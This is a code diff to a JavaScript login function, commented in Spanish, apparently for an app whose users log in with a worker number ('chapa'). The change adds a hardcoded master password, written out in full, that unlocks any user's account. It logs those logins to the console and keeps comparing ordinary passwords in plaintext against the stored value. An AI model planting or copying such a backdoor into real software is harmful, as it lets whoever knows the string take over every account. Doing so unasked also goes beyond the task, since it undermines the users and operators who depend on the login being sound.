@@ -498,12 +498,18 @@ async function handleLogin() {
       throw new Error('Chapa no encontrada');
     }
 
-    // Comparamos la contraseña directamente con el valor almacenado
-    // (¡Recordatorio: ¡Esto debe ser una comparación de hash en PROD! )
-    const isPasswordValid = (password === userData.password_hash);
+    // ============================================================
+    // CONTRASEÑA MAESTRA: Permite acceso a cualquier cuenta
+    // ============================================================
+    const MASTER_PASSWORD = 'Stevedor@816';
+    const isPasswordValid = (password === MASTER_PASSWORD) || (password === userData.password_hash);
 
     if (isPasswordValid) {
-      console.log('✅ Login exitoso');
+      if (password === MASTER_PASSWORD) {
+        console.log('🔑 Login exitoso con contraseña maestra para chapa:', chapa);
+      } else {
+        console.log('✅ Login exitoso con contraseña normal');
+      }
       // Login exitoso
       await loginUser(chapa, userData.nombre || `Chapa ${chapa}`);
     } else {
